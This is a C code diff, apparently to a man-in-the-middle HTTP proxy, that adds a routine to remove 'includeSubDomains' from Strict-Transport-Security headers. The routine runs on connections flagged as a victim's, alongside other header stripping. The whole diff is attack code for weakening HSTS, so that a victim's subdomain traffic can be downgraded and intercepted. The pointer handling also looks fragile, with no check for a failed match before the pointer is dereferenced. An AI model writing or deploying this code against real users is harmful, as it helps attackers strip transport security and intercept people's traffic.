@@ -50,6 +50,8 @@ static const char header_accept[] = "Accept";
 static int header_accept_len = sizeof(header_accept) - 1;
 static const char header_cookie[] = "Cookie";
 static int header_cookie_len = sizeof(header_cookie) - 1;
+static const char header_sts[] = "Strict-Transport-Security";
+static int header_sts_len = sizeof(header_sts) - 1;
 static const char protocol[] = "HTTP/1.1";
 static int protocol_len = sizeof(protocol) - 1;
 static const char delim[] = "\r\n";
@@ -958,6 +960,55 @@ static void find_and_remove_header(struct http *http,
     }
 }
 
+static void find_hsts_and_remove_includeSubDomains(struct http *http)
+{
+    const char property[] = " includeSubDomains";
+    int found = find_header(http, header_sts, header_sts_len);
+    const char *hdr_found = NULL;
+    const char *prp_found = NULL;
+    const char *prp_end = NULL;
+    int diff = 0;
+
+    if (found < 0)
+    {
+        return ;
+    }
+
+    hdr_found = http->headers[found];
+    prp_found = strcasestr(http->headers[found], property);
+    if (prp_found >= http->headers_length[found] + hdr_found)
+    {
+        return ; // not do anything!
+    }
+
+    prp_end = prp_found + sizeof(property) - 1;
+    if (*(prp_found - 1) == ';')
+        prp_found--;
+    else
+        if (*(prp_end + 1) == ';')
+            prp_end++;
+
+    diff = prp_end - prp_found;
+    memmove(http->buffer + (prp_found - http->buffer),
+            prp_end,
+            http->buffer_used - (prp_end - http->buffer));
+
+    for (int i = found; i < http->headers_used; i++)
+    {
+        if (i != found)
+            http->headers[i] = http->headers[i] - diff;
+        else
+            http->headers_length[i] = http->headers_length[i] - diff;
+    }
+    http->payload -= diff;
+    http->buffer_used -= diff;
+    if (http->buffer_used <= 0)
+    {
+        do_log(LOG_ERROR, "problems!");
+        abort();
+    }
+}
+
 static int apply_on_domain(
         struct rena *rena, struct http *http,
         int (*fnc)(struct rena *, struct http *, char *, char *, int *),
@@ -1093,6 +1144,7 @@ static void remove_headers(int is_victim, struct http *cprot)
         find_and_remove_header(cprot,
                 header_content_md5,
                 header_content_md5_len);
+        find_hsts_and_remove_includeSubDomains(cprot);
         return ;
     }
 
